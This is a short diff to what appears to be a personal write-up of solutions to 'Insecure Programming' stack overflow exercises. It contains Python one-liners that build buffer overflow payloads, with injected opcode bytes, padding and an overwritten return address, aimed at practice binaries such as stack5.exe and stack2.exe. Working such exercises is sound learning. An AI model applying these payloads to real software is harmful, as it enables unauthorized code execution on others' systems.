@@ -12,4 +12,6 @@ This document is intended to contain all my solutions to the [Insecure Programmi
   Note: This solution was tested in Linux. This may not work for you (the distance between the buffer and the location of the return addres may vary. 
 5. `$ python -c "print 'you win\x00' + '\x90\xcc' + '\x68\xf4\xfe\x18\x00' + '\xff\x15\x8c\x20\x40\x00' + 'A' * 67 + chr(0xfc) + chr(0xfe) + chr(0x18) + chr(0x0)" | stack5.exe`
   
+  `$ python -c "print 'you win\x21\x00' + '\x68\xf4\xfe\x18\x00' + '\xff\x15\x8c\x20\x40\x00' + 'A' * 68 + '\xfd\xfe\x18\x00'" | stack2.exe`
+  
   Note: The same as ex 4 but for Windows.
